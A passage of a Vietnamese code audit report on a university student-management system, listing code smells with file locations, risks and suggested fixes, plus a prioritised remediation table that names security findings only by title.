- **Biện pháp khắc phục (Actionable Recommendation):**
  Bổ sung điều kiện kiểm tra an toàn null:
  `if (section.getLecturer() == null || !section.getLecturer().getId().equals(lecturer.getId()))` trước khi truy cập id của giảng viên.

---

### SMELL-02: Ghép Chuỗi Trực Tiếp Tham Số URL Không Qua Mã Hóa trong Frontend Data Service
- **Đường dẫn tương đối:** `frontend/src/services/dataService.js:20, 39, 42, 49, 58, 95`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\frontend\src\services\dataService.js`
- **Dòng vi phạm:**
  - `dataService.js:20`: `search: (keyword) => api.get(\`/departments/search?keyword=\${keyword}\`),`
  - `dataService.js:39`: `search: (keyword) => api.get(\`/students/search?keyword=\${keyword}\`),`
  - `dataService.js:42`: `updateStatus: (id, status) => api.put(\`/students/\${id}/status?status=\${status}\`),`
  - `dataService.js:49`: `search: (keyword) => api.get(\`/lecturers/search?keyword=\${keyword}\`),`
  - `dataService.js:58`: `search: (keyword) => api.get(\`/subjects/search?keyword=\${keyword}\`),`
  - `dataService.js:95`: `adminBatchAssignClass: ... api.post(\`...&sectionId=\${sectionId}\`)`
- **Phân loại:** Code Smell / Bad Practice
- **Mức độ nghiêm trọng:** Medium
- **Mô tả & Dẫn chứng:**
  Trong file `dataService.js`, các hàm tìm kiếm và cập nhật ghép trực tiếp biến `keyword` và `status` vào query string của URL bằng template literal (`?keyword=${keyword}`) mà không qua hàm mã hóa URI (`encodeURIComponent`). Đáng chú ý là tại dòng 91 của cùng file này, tác giả đã chú thích: `// URLSearchParams tự mã hoá lý do có dấu/khoảng trắng`, chứng tỏ tác giả biết vấn đề này nhưng lại bỏ sót ở các hàm tìm kiếm.
- **Rủi ro & Tác động:**
  Nếu từ khóa tìm kiếm chứa ký tự tiếng Việt có dấu, khoảng trắng hoặc ký tự đặc biệt (`&`, `#`, `?`, `/`), URL sẽ bị hỏng định dạng hoặc bị cắt cụt query parameter, dẫn đến kết quả tìm kiếm sai hoặc lỗi request.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Sử dụng đối tượng `params` có sẵn của `api.js` (nơi đã có `new URLSearchParams()`) hoặc bọc giá trị bằng `encodeURIComponent(keyword)`.

---

### SMELL-03: Đứt Gãy Ràng Buộc Dữ Liệu: Tạo Lớp Sinh Hoạt Không Thể Gán Khóa Học & Chuyên Ngành
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/dto/request/ClassRequest.java:8-20` và `backend/src/main/java/com/sms/service/ClassService.java:44-50`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\dto\request\ClassRequest.java` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\ClassService.java`
- **Dòng vi phạm:**
  - `ClassRequest.java:8-20`: Chỉ có `code`, `name`, `departmentId`, `academicYear`
  - `ClassService.java:44-50`: Không hề set `major` và `cohort`
- **Phân loại:** Code Smell / Architectural Gap
- **Mức độ nghiêm trọng:** Medium
- **Mô tả & Dẫn chứng:**
  Bảng CSDL `classes` và Entity `ClassEntity` có hai khóa ngoại liên kết quan trọng: `major_id` và `cohort_id`. Tuy nhiên DTO `ClassRequest` hoàn toàn không có 2 trường này, và `ClassService` khi tạo mới lớp cũng không gán chuyên ngành hay khóa học.
  Hậu quả là: Khi sinh viên thuộc lớp mới tạo này tra cứu chương trình đào tạo tại `CurriculumService.getMyCurriculum`, hệ thống sẽ luôn ném lỗi `BadRequestException`:
  ```java
  if (classEntity == null || classEntity.getMajor() == null || classEntity.getCohort() == null) {
      throw new BadRequestException("Sinh viên chưa được gán chuyên ngành và khóa học để tra cứu chương trình đào tạo");
  }
  ```
- **Rủi ro & Tác động:**
  Chức năng xem khung chương trình đào tạo của sinh viên sẽ bị tê liệt hoàn toàn đối với bất kỳ lớp học nào được tạo từ giao diện Quản trị viên.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Bổ sung `Integer majorId` và `Integer cohortId` vào `ClassRequest`, đồng thời cập nhật `ClassService.create` và `update` để tìm và gán `Major` cùng `Cohort` tương ứng cho `ClassEntity`.

---

### SMELL-04: Dữ Liệu "Chết" Không Thể Truy Xuất: Bảng Notifications và Student Invoices Không Có API
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/entity/Notification.java:1-35` và `backend/src/main/java/com/sms/service/scheduler/AcademicScheduler.java:65-70`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\entity\Notification.java` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\scheduler\AcademicScheduler.java`
- **Dòng vi phạm:** Toàn bộ entity `Notification` và `StudentInvoice`
- **Phân loại:** Code Smell / Dead Feature
- **Mức độ nghiêm trọng:** Low
- **Mô tả & Dẫn chứng:**
  Trong `AcademicScheduler.java`, khi một lớp học phần bị hủy do không đủ sĩ số, hệ thống tạo bản ghi `Notification` và lưu vào bảng `notifications`. Tương tự trong `SpecialClassService.java`, khi chốt học phí lớp riêng, hệ thống tạo bản ghi `StudentInvoice`.
  Tuy nhiên, rà soát toàn bộ project cho thấy **hoàn toàn không có bất kỳ Controller nào (hay API endpoint nào) để đọc, liệt kê hoặc đánh dấu đã đọc thông báo, cũng như không có giao diện nào trên Frontend cho sinh viên xem hóa đơn hay thông báo**.
- **Rủi ro & Tác động:**
  Dữ liệu thông báo và hóa đơn được ghi vào CSDL nhưng người dùng không bao giờ nhận được hay nhìn thấy; gây phình to dung lượng CSDL vô ích và tạo ra mã nguồn "chết" (Dead Code).
- **Biện pháp khắc phục (Actionable Recommendation):**
  Xây dựng `NotificationController` và `InvoiceController` cùng component chuông thông báo trên Header và trang tra cứu học phí của sinh viên, hoặc dọn dẹp các logic này nếu không còn nằm trong phạm vi đồ án.

---

### SMELL-05: Tệp Kiểm Thử "Lạc" (Alien Test Files) Gây Nhiễu Codebase
- **Đường dẫn tương đối:** `frontend/src/tests/chat-logic.test.ts:1-399`, `tests/chat-logic.test.ts`, và `tests/slash-command-menu.spec.ts`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\frontend\src\tests\chat-logic.test.ts`
- **Dòng vi phạm:** Toàn bộ các file trên
- **Phân loại:** Code Smell / Dead Code
- **Mức độ nghiêm trọng:** Low
- **Mô tả & Dẫn chứng:**
  Trong thư mục `frontend/src/tests/` và `tests/` xuất hiện các tệp kiểm thử `chat-logic.test.ts` và `slash-command-menu.spec.ts` kiểm tra các lệnh gạch chéo `/goal`, `/schedule`, `/grill-me`, `/agy-customizations`, các model AI Gemini / Claude. Đây là các file test bị copy nhầm từ một dự án chatbot/AI Antigravity khác và hoàn toàn không liên quan gì đến Hệ thống Quản lý Đào tạo & Sinh viên.
- **Rủi ro & Tác động:**
  Gây hiểu lầm cho người chấm đồ án và các lập trình viên khác, làm tăng thời gian chạy test suite và gây sai lệch độ phủ kiểm thử (test coverage) của dự án.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Xóa bỏ các tệp test ngoại lai này khỏi dự án SMS.

---

### SMELL-06: Số Phép Thuật (Magic Numbers) Rải Rác Trong Logic Tính Điểm & Xếp Lớp
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/entity/Grade.java:104-107, 120-152` và `backend/src/main/java/com/sms/service/CourseSectionService.java:84-85`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\entity\Grade.java` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\CourseSectionService.java`
- **Dòng vi phạm:**
  - `Grade.java:104-107`: các trọng số `0.05`, `0.3`, `0.6`
  - `Grade.java:120-152`: các ngưỡng điểm `8.5`, `8.0`, `7.0`, `6.5`, `5.5`, `5.0`, `4.0`, `3.0`
  - `CourseSectionService.java:85`: tỉ lệ `2.0 / 3.0`
- **Phân loại:** Code Smell
- **Mức độ nghiêm trọng:** Low
- **Mô tả & Dẫn chứng:**
  Các giá trị số mang ý nghĩa nghiệp vụ quan trọng (trọng số điểm thành phần, ngưỡng quy đổi thang 4, điểm liệt cuối kỳ, tỉ lệ mở lớp tối thiểu) được viết trực tiếp dưới dạng số literal rải rác trong thân hàm thay vì được khai báo thành các hằng số rõ nghĩa (`public static final BigDecimal WEIGHT_CC = ...`).
- **Rủi ro & Tác động:**
  Khó bảo trì và dễ gây sai sót khi quy chế đào tạo của nhà trường thay đổi tỉ lệ hoặc thang điểm; vi phạm nguyên tắc Clean Code.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Định nghĩa các hằng số tường minh trong class cấu hình nghiệp vụ hoặc constants interface (ví dụ `AcademicConstants.java`).

---

### SMELL-07: Khớp Nối Chặt Phi Lý Giữa Thực Thể `Lecturer` và `Student.Gender`
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/entity/Lecturer.java:35` và `backend/src/main/java/com/sms/service/LecturerService.java:128`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\entity\Lecturer.java` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\LecturerService.java`
- **Dòng vi phạm:**
  - `Lecturer.java:35`: `private Student.Gender gender;`
  - `LecturerService.java:128`: `private Student.Gender parseGender(String g)`
- **Phân loại:** Code Smell / Architectural Smell
- **Mức độ nghiêm trọng:** Low
- **Mô tả & Dẫn chứng:**
  Thực thể `Lecturer` (Giảng viên) lại khai báo thuộc tính giới tính bằng cách trỏ trực tiếp vào enum nội bộ của thực thể `Student` (`Student.Gender`).
- **Rủi ro & Tác động:**
  Vi phạm tính độc lập của các mô hình thực thể (Domain Model Coupling). Nếu trong tương lai thực thể `Student` bị refactor hoặc phân tách module, thực thể `Lecturer` sẽ bị ảnh hưởng theo.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Tách `Gender` thành một enum độc lập ở cấp package `com.sms.enums.Gender` hoặc `com.sms.entity.Gender` dùng chung cho cả Sinh viên và Giảng viên.

---

### SMELL-08: Không Đồng Bộ Trạng Thái Kích Hoạt Giữa `Lecturer` và `User` Khi Toggle Active
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/service/LecturerService.java:122-126`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\LecturerService.java`
- **Dòng vi phạm:** `LecturerService.java:122-126`
  ```java
  @Transactional
  public void toggleActive(Long id) {
      Lecturer lecturer = findById(id);
      lecturer.setIsActive(!lecturer.getIsActive());
      lecturerRepository.save(lecturer);
  }
  ```
- **Phân loại:** Code Smell / Logic Bug
- **Mức độ nghiêm trọng:** Low
- **Mô tả & Dẫn chứng:**
  Trong `StudentService.java:143-149`, khi cập nhật trạng thái sinh viên bị khóa, hệ thống đã đồng bộ cập nhật `user.setIsActive(...)` tương ứng. Tuy nhiên trong `LecturerService.toggleActive`, phương thức chỉ đổi trạng thái cột `lecturers.is_active`, trong khi tài khoản đăng nhập `users.is_active` vẫn giữ nguyên là `true`.
- **Rủi ro & Tác động:**
  Dù giảng viên đã bị vô hiệu hóa trên danh sách nhân sự của nhà trường, tài khoản của họ vẫn có thể đăng nhập vào cổng portal giảng viên bình thường.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Đồng bộ hóa tài khoản `User` liên kết trong hàm `toggleActive`:
  ```java
  if (lecturer.getUser() != null) {
      lecturer.getUser().setIsActive(lecturer.getIsActive());
      userRepository.save(lecturer.getUser());
  }
  ```

---

### SMELL-09: Lưu Trực Tiếp Thực Thể JPA Đang Đính Kèm/Tách Rời Vào Spring Cache
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/service/SubjectService.java:27-32`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\SubjectService.java`
- **Dòng vi phạm:** `SubjectService.java:27`
  ```java
  @Cacheable(value = "subjects", key = "'all'")
  public List<Subject> findAll() {
      List<Subject> subjects = subjectRepository.findAll();
      subjects.forEach(s -> org.hibernate.Hibernate.initialize(s.getPrerequisites()));
      return subjects;
  }
  ```
- **Phân loại:** Code Smell / Bad Practice
- **Mức độ nghiêm trọng:** Low
- **Mô tả & Dẫn chứng:**
  Lưu trữ trực tiếp các Hibernate Entity (`Subject`) có liên kết quan hệ vào Spring Cache (`@Cacheable`). Khi các thực thể này được lấy ra từ cache trong các transaction hoặc thread khác, chúng trở thành đối tượng detached (tách rời khỏi Hibernate Session hiện tại).
- **Rủi ro & Tác động:**
  Nếu code truy cập vào các thuộc tính lazy-loading của đối tượng lấy từ cache ngoài transaction, Hibernate sẽ ném lỗi `LazyInitializationException`. Ngoài ra, nếu một thread thay đổi thuộc tính của entity trong cache, nó có thể làm sai lệch dữ liệu dùng chung trong bộ nhớ.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Chỉ cache các đối tượng DTO bất biến (ví dụ `List<SubjectResponse>`) thay vì cache trực tiếp JPA Entity.

---

## V. BẢNG TỔNG HỢP & MA TRẬN ƯU TIÊN KHẮC PHỤC (REMEDIATION MATRIX)

| Mã ID | Tiêu đề phát hiện | Phân loại | Mức độ | Vị trí file & Dòng |
| :--- | :--- | :--- | :---: | :--- |
| **PERF-01** | Thảm họa N+1 queries duyệt stream toàn bộ SV | Performance | **CRITICAL** | `AcademicWarningController.java:33-45` |
| **SEC-01** | HTML Injection / Email XSS & Spam Relay | Security | **HIGH** | `EmailService.java:105-154`, `PasswordResetService.java:234` |
| **SEC-02** | Wildcard CORS nới lỏng cùng allowCredentials | Security | **HIGH** | `application.properties:55`, `SecurityConfig.java:104` |
| **SMELL-01** | Rủi ro NullPointerException khi giảng viên null | Code Smell | **HIGH** | `GradeService.java:229`, `CourseSectionService.java:157` |
| **SEC-03** | CSV / Spreadsheet Formula Injection | Security | **MEDIUM** | `export.js:2`, `ExcelExportService.java:171` |
| **SEC-04** | Bypass thu hồi JWT khi tài khoản bị khóa/đổi MK | Security | **MEDIUM** | `JwtAuthFilter.java:56`, `UserPrincipal.java:52` |
| **SEC-05** | Thông tin CSDL mặc định, mật khẩu rỗng | Security | **MEDIUM** | `application.properties:11`, `docker-compose.yml:9` |
| **SEC-06** | Hở quyền & NPE tại `/api/auth/change-password` | Security | **MEDIUM** | `SecurityConfig.java:45`, `AuthController.java:35` |
| **PERF-02** | Lệch chuẩn hợp đồng phân trang Cảnh báo học vụ | Performance | **MEDIUM** | `AcademicWarningsPage.jsx:38`, `AcademicWarningController:29` |
| **PERF-03** | Map login attempts không có TTL gây rò rỉ RAM | Performance | **MEDIUM** | `LoginAttemptService.java:22,48` |
| **PERF-04** | N+1 query lặp & insert tuần tự trong tính học phí | Performance | **MEDIUM** | `SpecialClassService.java:113,124-138` |
| **PERF-05** | N+1 query lồng nhau khi tra cứu khung CTĐT | Performance | **MEDIUM** | `CurriculumService.java:51-72` |
| **PERF-06** | Re-render toàn bộ bảng vào điểm khi gõ phím | Performance | **MEDIUM** | `GradeEntryPage.jsx:69-77` |
| **SMELL-02** | Ghép URL không encodeURIComponent trên FE | Code Smell | **MEDIUM** | `dataService.js:20,39,42,49,58,95` |
| **SMELL-03** | Tạo lớp sinh hoạt thiếu gán Major & Cohort | Bad Practice | **MEDIUM** | `ClassRequest.java:8-20`, `ClassService.java:44` |
| **SEC-07** | Thiếu HTTP Security Headers & hở Swagger | Security | **LOW** | `frontend/nginx.conf:20-43` |
| **SMELL-04** | Dữ liệu Notification & Invoice không có API đọc | Code Smell | **LOW** | `Notification.java`, `StudentInvoice.java` |
| **SMELL-05** | Tệp test ngoại lai từ Antigravity làm bẩn dự án | Code Smell | **LOW** | `frontend/src/tests/chat-logic.test.ts` |
| **SMELL-06** | Magic numbers trong công thức tính điểm & xếp lớp | Code Smell | **LOW** | `Grade.java:104,120`, `CourseSectionService.java:85` |
| **SMELL-07** | Thực thể Lecturer tham chiếu trực tiếp Student.Gender| Code Smell | **LOW** | `Lecturer.java:35`, `LecturerService.java:128` |
| **SMELL-08** | Toggle Active giảng viên không khóa tài khoản User | Bad Practice | **LOW** | `LecturerService.java:122-126` |
| **SMELL-09** | Cache JPA Entity thay vì DTO bất biến | Bad Practice | **LOW** | `SubjectService.java:27-32` |
